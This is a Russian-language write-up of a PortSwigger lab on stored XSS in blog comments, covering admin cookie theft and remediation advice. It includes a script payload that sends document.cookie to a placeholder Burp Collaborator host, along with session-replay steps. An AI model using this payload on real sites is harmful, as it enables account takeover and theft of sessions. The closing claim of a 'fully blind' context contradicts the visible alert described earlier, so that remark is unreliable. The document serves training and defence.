Write-up: Кража сессионных cookie через Stored XSS с использованием Burp Collaborator
Лаборатория: PortSwigger Web Security Academy
Уровень: Практик
Тема: Stored XSS, кража cookie, Burp Collaborator
Цель: Получить cookie администратора и войти в его аккаунт

Описание уязвимости
В блоге веб-приложения реализован функционал комментариев, который сохраняет пользовательский ввод и отображает его без надлежащей санитизации.
Отсутствует экранирование HTML-тегов и JavaScript-кода, что позволяет внедрить произвольный скрипт, выполняемый в браузере любого посетителя страницы.
Сервер не устанавливает флаг HttpOnly для сессионных cookie, делая их доступными через document.cookie.
Злоумышленник может использовать эту Stored XSS-уязвимость для перехвата сессий администратора и других пользователей.

Тип уязвимости
Stored (Persistent) Cross-Site Scripting (XSS)
Client-side инъекция
Нарушение целостности данных и конфиденциальности сессий

Точка входа
POST /post/comment – форма добавления комментария.
Уязвимое поле: Comment (также возможно в других полях, но эксплуатация проведена через него).

Метод обнаружения
В поле Comment отправлен классический вектор:
<script>alert(1)</script>
После публикации комментария и перезагрузки страницы появилось всплывающее окно alert(1).
При повторном открытии страницы тем же или другим пользователем окно появляется вновь.
Вывод: XSS носит хранимый характер – вредоносный код постоянно находится на сервере и выполняется у каждого посетителя страницы.

Концептуальный пример
Вектор для проверки выполнения:
<script>alert('XSS')</script>
Результат: выполнение JavaScript в контексте домена уязвимого приложения.

Вектор для кражи cookie:
<script>
navigator.sendBeacon('https://УНИКАЛЬНЫЙ_ПОДДОМЕН.burpcollaborator.net', document.cookie);
</script>
Результат:
При открытии страницы жертвой её браузер отправляет POST-запрос на подконтрольный злоумышленнику сервер Burp Collaborator.
Тело запроса содержит значение document.cookie жертвы.

Логика эксплуатации
Эксплуатация строится на трёх ключевых этапах:
1. Внедрение вредоносного скрипта
В комментарий помещается JavaScript, который отправляет document.cookie на внешний сервер.
Использован navigator.sendBeacon() – метод, гарантированно не блокируемый политикой CORS и работающий асинхронно даже при выгрузке страницы.
Почему не fetch с mode: 'no-cors'?
sendBeacon проще, не требует установки заголовков и полностью обходит все ограничения CORS. Это делает его идеальным выбором для кражи данных в условиях изолированной лаборатории.

2. Ожидание взаимодействия жертвы
Жертва (симулированный администратор) заходит на страницу блога спустя некоторое время (от 10 до 60 секунд) после публикации комментария.
Критическое условие успеха:
Не заходить на страницу блога самостоятельно после отправки пейлоада – иначе в Collaborator попадёт собственный cookie, что затруднит идентификацию администраторской сессии.
Использовать новый уникальный поддомен Collaborator для каждой попытки, чтобы исключить ложные срабатывания от предыдущих тестов.

3. Получение и использование cookie
Burp Collaborator фиксирует HTTP-взаимодействие: POST на поддомен с телом, содержащим session=....
Извлечённое значение сессионного cookie подставляется в браузер или в запрос через Burp Repeater.
После подмены cookie открывается страница /my-account – доступ к личному кабинету администратора подтверждает успешную атаку.
Потенциальное воздействие
Полный захват учётной записи администратора – злоумышленник получает возможность действовать от лица привилегированного пользователя.
Эскалация привилегий – через административный доступ возможно выполнение любых действий в приложении (управление пользователями, изменение контента, доступ к БД).
Распространение вредоносного кода – сохранённый XSS позволяет атаковать всех посетителей уязвимой страницы, включая обычных пользователей.
Компрометация данных – cookie могут содержать не только идентификатор сессии, но и другую чувствительную информацию.

Рекомендации по устранению
Валидация и санитизация входных данных
Экранировать HTML-спецсимволы (<, >, &, ", ') при выводе пользовательского контента.
Использовать специализированные библиотеки (DOMPurify) для очистки HTML, если разрешено форматирование.
Установка флага HttpOnly для сессионных cookie
Запрещает доступ к cookie через JavaScript, полностью блокируя кражу через XSS.
Применение Content Security Policy (CSP)
Ограничить источники скриптов и запретить unsafe-inline.
Включить директиву script-src 'self', чтобы исключить выполнение инлайновых скриптов.
Разделение пользовательского контента и кода
Не сохранять и не выводить пользовательский ввод без обработки в контексте HTML/JavaScript.
Использовать шаблонизаторы с автоматическим экранированием.
Регулярное сканирование на XSS-уязвимости
Включить автоматические анализаторы в CI/CD.

Примечание
Уязвимость обнаружена в полностью слепом контексте – без какого-либо вывода данных непосредственно в ответе сервера.
Подтверждение эксплуатации выполнено исключительно через анализ входящих запросов на сервере Collaborator, что является общепринятой практикой при тестировании Stored XSS в изолированных средах.
